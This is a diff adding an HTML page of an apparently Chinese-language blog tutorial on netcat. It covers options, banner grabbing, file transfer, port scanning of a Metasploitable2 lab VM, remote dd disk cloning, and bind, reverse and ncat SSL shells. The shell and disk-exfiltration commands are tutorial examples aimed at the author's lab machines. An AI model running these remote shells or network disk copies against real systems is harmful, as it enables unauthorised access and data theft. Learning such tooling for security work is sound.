@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"cs-cshi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null,"activeClass":"valine"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Netcat 常被称为网络工具中的瑞士军刀，以体积小（可执行 200KB）功能灵活而著称。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="netcat">
+<meta property="og:url" content="https://cs-cshi.github.io/cybersecurity/netcat/index.html">
+<meta property="og:site_name" content="Chang">
+<meta property="og:description" content="Netcat 常被称为网络工具中的瑞士军刀，以体积小（可执行 200KB）功能灵活而著称。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-05-23T06:50:57.000Z">
+<meta property="article:modified_time" content="2021-06-26T01:08:52.268Z">
+<meta property="article:author" content="Charles">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="网络安全">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://cs-cshi.github.io/cybersecurity/netcat/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>netcat | Chang</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chang</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页 | home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于 | about</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签 | tags<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类 | categories<span class="badge">25</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档 | archives<span class="badge">44</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索 | search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cs-cshi.github.io/cybersecurity/netcat/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Charles">
+      <meta itemprop="description" content="慢下来，记录生活点滴，畅游人类知识和艺术的海洋。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chang">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          netcat
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-05-23 14:50:57" itemprop="dateCreated datePublished" datetime="2021-05-23T14:50:57+08:00">2021-05-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-26 09:08:52" itemprop="dateModified" datetime="2021-06-26T09:08:52+08:00">2021-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">工具</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/cybersecurity/netcat/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/cybersecurity/netcat/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Netcat 常被称为网络工具中的瑞士军刀，以体积小（可执行 200KB）功能灵活而著称。</p>
+<span id="more"></span>
+
+<blockquote>
+<p>不同系统平台的 nc 参数功能不尽相同</p>
+</blockquote>
+<p>在 debian/ubuntu 下面：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readlink -f $(which nc)</span><br></pre></td></tr></table></figure>
+<p>看看，结果会有两种：</p>
+<blockquote>
+<ul>
+<li>/bin/nc.traditional: 默认 GNU 基础版本，一般系统自带。</li>
+<li>/bin/nc.openbsd: openbsd 版本，强大很多。</li>
+</ul>
+</blockquote>
+<p>可以用 apt-get install nc-traditional 或者 apt-get install nc-openbsd 来选择安装。不管是 gnu 版本还是 openbsd 版本，都有新老的区别，主要是传送文件时 stdin 发生 EOF 了，老版本会自动断开，而新的 gnu/openbsd 还会一直连着。</p>
+<p>语法</p>
+<blockquote>
+<p>nc [-hlnruz][-g&lt;网关…&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v…][-w&lt;超时秒数&gt;][主机名称][通信端口…]</p>
+</blockquote>
+<p>参数说明</p>
+<blockquote>
+<ul>
+<li>-g&lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个。</li>
+<li>-G&lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数。</li>
+<li>-h 在线帮助。</li>
+<li>-i&lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口。</li>
+<li>-l 使用监听模式，管控传入的资料。</li>
+<li>-n 直接使用IP地址，而不通过域名服务器。</li>
+<li>-o&lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。</li>
+<li>-p&lt;通信端口&gt; 设置本地主机使用的通信端口。</li>
+<li>-r 乱数指定本地与远端主机的通信端口。</li>
+<li>-s&lt;来源位址&gt; 设置本地主机送出数据包的IP地址。</li>
+<li>-u 使用UDP传输协议。</li>
+<li>-v 显示指令执行过程。</li>
+<li>-w&lt;超时秒数&gt; 设置等待连线的时间。</li>
+<li>-z 使用0输入/输出模式，只在扫描通信端口时使用。</li>
+</ul>
+</blockquote>
+<h2 id="1-telnet-banner"><a href="#1-telnet-banner" class="headerlink" title="1. telnet / banner"></a>1. telnet / banner</h2><p>查看 163 邮箱的 banner 信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 找到 163 邮箱的 ip 地址</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ping pop3.163.com</span></span><br><span class="line">PING pop3.163.idns.yeah.net (220.181.12.110) 56(84) bytes of data.</span><br><span class="line">64 bytes from m12-110.163.com (220.181.12.110): icmp_seq=1 ttl=53 time=28.5 ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用 netcat 获取 banner</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pop3 协议默认端口110</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -nv 220.181.12.110 110</span> </span><br><span class="line">(UNKNOWN) [220.181.12.110] 110 (pop3) open</span><br><span class="line">+OK Welcome to coremail Mail Pop3 Server (163coms[10774b260cc7a37d26d71b52404dcf5cs])</span><br><span class="line"><span class="meta">#</span><span class="bash"> 接下来可以输入账号密码登录邮箱进行操作</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> ping smtp.163.com</span></span><br><span class="line">PING smtp.163.com (220.181.12.17) 56(84) bytes of data.</span><br><span class="line">64 bytes from m12-17.163.com (220.181.12.17): icmp_seq=1 ttl=53 time=34.9 ms</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> smtp 默认端口25</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -nv 220.181.12.17 25</span>  </span><br><span class="line">(UNKNOWN) [220.181.12.17] 25 (smtp) open</span><br><span class="line">220 163.com Anti-spam GT for Coremail System (163com[20141201])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-v 显示命令执行过程中的详细信息</li>
+<li>-n 不作域名解析</li>
+</ul>
+<blockquote>
+<p>pop3 传入的数据需要进行 base64 编码：<br>$ base64<br>输入需要进行 base64编码的文本<br>ctrl + d 获得结果</p>
+</blockquote>
+<p>通过 netcat 连接我的 metasploitable2（192.168.1.106）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc -nv 192.168.1.106:80</span></span><br><span class="line">(UNKNOWN) [192.168.1.106] 80 (http) open</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 获得 head 信息</span></span><br><span class="line">head</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"></span><br><span class="line">                _                  _       _ _        _     _      ____  </span><br><span class="line"> _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ </span><br><span class="line">| &#x27;_ ` _ \ / _ \ __/ _` / __| &#x27;_ \| |/ _ \| | __/ _` | &#x27;_ \| |/ _ \ __) |</span><br><span class="line">| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ </span><br><span class="line">|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|</span><br><span class="line">                            |_|                                          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Warning: Never expose this VM to an untrusted network!</span><br><span class="line"></span><br><span class="line">Contact: msfdev[at]metasploit.com</span><br><span class="line"></span><br><span class="line">Login with msfadmin/msfadmin to get started</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;TWiki&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;WebDAV&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-传输文本信息"><a href="#2-传输文本信息" class="headerlink" title="2. 传输文本信息"></a>2. 传输文本信息</h2><blockquote>
+<p>远程电子取证信息收集</p>
+</blockquote>
+<p>通过 metasploitable2(192.168.1.106) 与 kali 两台虚机来演示</p>
+<p>metasploitable2 上查看预使用的端口是否被占用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netstat -pantu | grep 333</span><br></pre></td></tr></table></figure>
+<p>无输出表明 333 端口未占用</p>
+<p>metasploitable2 用 nc 监听 333端口：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -l -p 333</span><br></pre></td></tr></table></figure>
+
+<p>kali 上使用 nc 连接 metasploitable2:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -nv 192.168.1.106 333</span><br><span class="line">(UNKNOWN) [192.168.1.106] 333 (?) open  </span><br><span class="line">hello kali  # 传输文本。文本会传输至 metasploitable2，同样 matasploitable2 也可以传输文本至 kali</span><br></pre></td></tr></table></figure>
+
+<p>将 metasploitable2 上信息传至 kali(192.168.1.108)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali 上打开监听端口，并将内容存储到 ps.txt</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo nc -l -p 333 &gt; ps.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> metasploitable2 上将进程信息传输至 kali</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> -q ： quit after EOF on stdin and delay of secs</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ps aux | nc -nv 192.168.1.108 333 -q 1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3-传输文件-目录"><a href="#3-传输文件-目录" class="headerlink" title="3. 传输文件/目录"></a>3. 传输文件/目录</h2><ul>
+<li>传输文件<ul>
+<li>A(接收端)：nc -lp 333 &gt; 1.mp4    </li>
+<li>B(发送端)：nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1</li>
+<li>或</li>
+<li>A(发送端)：nc -q 1 -lp 333 &lt; a.mp4 -q 1<ul>
+<li>等待其他人连接 333 端口下载 a.mp4 </li>
+</ul>
+</li>
+<li>B(接收端)： nc -nv 1.1.1.1 333 &gt; 2.mp4</li>
+</ul>
+</li>
+<li>传输目录<ul>
+<li>A(发送端)：tar -cvf music/ | nc -lp 333 -q 1<ul>
+<li>被动等接收 -cvf 打包</li>
+</ul>
+</li>
+<li>B：nc -nv 1.1.1.1 333 | tar -xvf  <ul>
+<li>-xvf 解包</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>加密传文件(利用系统的 mcrypt 加密)<ul>
+<li>A(接收端,解密)：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4<ul>
+<li>mcrypt 解密，加密算法</li>
+<li>解密完成后 flush，本地不留缓存</li>
+</ul>
+</li>
+<li>B(发送端,加密)：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-流媒体服务"><a href="#4-流媒体服务" class="headerlink" title="4. 流媒体服务"></a>4. 流媒体服务</h2><ul>
+<li>A(服务器)：cat 1.mp4 | nc -lp 333</li>
+<li>B(客户端)：nc -nv 1.1.1.1 333 | mplayer -vo xll -cache 3000 -<ul>
+<li>mplayer 媒体播放器(支持命令行)</li>
+</ul>
+</li>
+</ul>
+<h2 id="5-端口扫描"><a href="#5-端口扫描" class="headerlink" title="5. 端口扫描"></a>5. 端口扫描</h2><blockquote>
+<p>默认使用 tcp 去探测，探测到的也是 tcp 端口<br>每个扫描器不一定完全准确，可以多使用几款工具和方式来扫描<br>nc 准确性没 nmap 等工具高，可作为参考</p>
+</blockquote>
+<ul>
+<li>nc -nvz 1.1.1.1 1-65535<ul>
+<li>tcp</li>
+</ul>
+</li>
+<li>nc -nvzu 1.1.1.1 <ul>
+<li>udp（可能不准确）<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 10.0.0.50 metasploitable2 ip地址，相当于前文的 192.168.1.106</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nc -nvz 10.0.0.50 1-65535</span></span><br><span class="line">(UNKNOWN) [10.0.0.50] 54951 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 48585 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 44601 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 36467 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 8787 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 8180 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 8009 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 6697 (ircs-u) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 6667 (ircd) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 6000 (x11) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 5900 (?) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 5432 (postgresql) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 3632 (distcc) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 3306 (mysql) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 2121 (iprop) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 2049 (nfs) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 1524 (ingreslock) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 1099 (rmiregistry) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 514 (shell) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 513 (login) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 512 (exec) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 445 (microsoft-ds) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 139 (netbios-ssn) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 111 (sunrpc) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 80 (http) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 53 (domain) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 25 (smtp) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 23 (telnet) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 22 (ssh) open</span><br><span class="line">(UNKNOWN) [10.0.0.50] 21 (ftp) open</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h2 id="6-远程克隆硬盘"><a href="#6-远程克隆硬盘" class="headerlink" title="6. 远程克隆硬盘"></a>6. 远程克隆硬盘</h2><blockquote>
+<p>操作系统上删除文件时，磁盘的磁头不会对每一位都初始化，只是在操作系统层删除(标记删除)，实际上硬盘上的每个扇区、每个磁道、每一位还是完整存在，所以删除的文件可以还原，除非被覆盖了。<br>dd 硬盘块级别的备份，每一位是0还是1镜像复制</p>
+</blockquote>
+<ul>
+<li>A(接收端)：nc -lp 333 | dd of=/dev/sda<ul>
+<li>/dev/sda 挂的硬盘</li>
+</ul>
+</li>
+<li>B(发送端)：dd if=/dev/sda | nc -nv 1.1.1.1 333 -q l</li>
+</ul>
+<blockquote>
+<p>远程电子取证，可以将目标服务器硬盘远程复制</p>
+</blockquote>
+<h2 id="7-远程控制"><a href="#7-远程控制" class="headerlink" title="7. 远程控制"></a>7. 远程控制</h2><blockquote>
+<p>nc 建立连接后，被控的可以是客户端，也可以是服务器端</p>
+</blockquote>
+<ul>
+<li>正向<ul>
+<li>A(被控端)：nc -lp 333 -c bash<ul>
+<li>将 bash 传到 333 端口</li>
+</ul>
+</li>
+<li>B(控制端)：nc -nv 1.1.1.1 333<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(metasploitable2) $ sudo nc -lp 333 -c bash</span><br><span class="line"></span><br><span class="line">(kali) $ nc -nv 1.1.1.1 333   </span><br><span class="line">(UNKNOWN) [10.0.0.50] 333 (?) open</span><br><span class="line">ls</span><br><span class="line">vulnerable</span><br><span class="line">pwd</span><br><span class="line">/home/msfadmin</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>反向<ul>
+<li>A(控制端)：nc -lp 333</li>
+<li>B(被控端)：nc -nv 1.1.1.1 333 -c bash<blockquote>
+<ul>
+<li>windows 将 bash 改成 cmd</li>
+<li>可能由于防火墙等等原因，控制端(攻击方)连不上被控端(目标)，此时可以采用反向，让目标机主动来连攻击方。</li>
+<li>外向内限制 or 内向外限制</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="8-ncat"><a href="#8-ncat" class="headerlink" title="8. ncat"></a>8. ncat</h2><blockquote>
+<ul>
+<li>netcat 缺乏加密（明文传输）</li>
+<li>netcat 缺乏身份验证能力</li>
+</ul>
+</blockquote>
+<p>ncat 可以弥补 netcat 缺乏加密、身份验证的能力</p>
+<p>ncat 包含于 nmap 工具包中</p>
+<ul>
+<li>A：ncat -c bash -allow 1.1.1.1 -vnl 333 -ssl<ul>
+<li>-allow 允许连接的 ip 地址</li>
+<li>-ssl 加密方式 （整个管道都会加密）</li>
+</ul>
+</li>
+<li>B：ncat -nv 1.1.1.1 333 –ssl<blockquote>
+<p>连接时会先交换 ssl fingerprint m</p>
+</blockquote>
+</li>
+</ul>
+<p>————————————————</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/83959309">用好你的瑞士军刀/netcat</a></li>
+<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000016626298">netcat 命令详解</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+      
+  <div class="popular-posts-header">相关文章推荐</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\tcpdump\" rel="bookmark">tcpdump</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\wireshark\" rel="bookmark">wireshark</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\cybersecurity\超详细SQLMap使用攻略及技巧分享\" rel="bookmark">超详细SQLMap使用攻略及技巧分享</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\cybersecurity\Metasploit Framework\" rel="bookmark">Metasploit Framework</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\Virtualbox虚拟机网络连接方式详解\" rel="bookmark">Virtualbox虚拟机网络连接方式详解</a></div>
+    </li>
+  </ul>
+
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Charles 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Charles 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Charles
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://cs-cshi.github.io/cybersecurity/netcat/" title="netcat">https://cs-cshi.github.io/cybersecurity/netcat/</a>
+  </li>
+  <li class="post-copyright-license">
